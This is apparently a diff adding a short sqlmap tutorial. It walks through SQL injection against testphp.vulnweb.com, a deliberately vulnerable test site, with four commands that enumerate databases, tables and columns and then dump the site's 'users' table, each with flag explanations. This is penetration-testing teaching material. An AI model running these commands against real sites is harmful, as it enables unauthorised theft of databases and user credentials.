@@ -1,0 +1,31 @@
+Let’s take an example
+--> http://testphp.vulnweb.com/artists.php?artist=1
+
+
+1. Database command
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+-u:  target URL
+–dbs: fetch database name
+–batch: This will leave sqlmap to go with default behavior whenever user’s input would be required
+
+2. Table command
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+
+-D: DBMS database to enumerate (fetched database name)
+–tables: enumerate DBMS database table
+
+3. Collumn command
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
+-T: DBMS table to enumerate (fetched table name)
+–columns: enumerate DBMS database columns
+
+4. Retrieve all the data
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
+–dump: dump all information of DBMS database
+
+5. Reference 
+--> https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
+
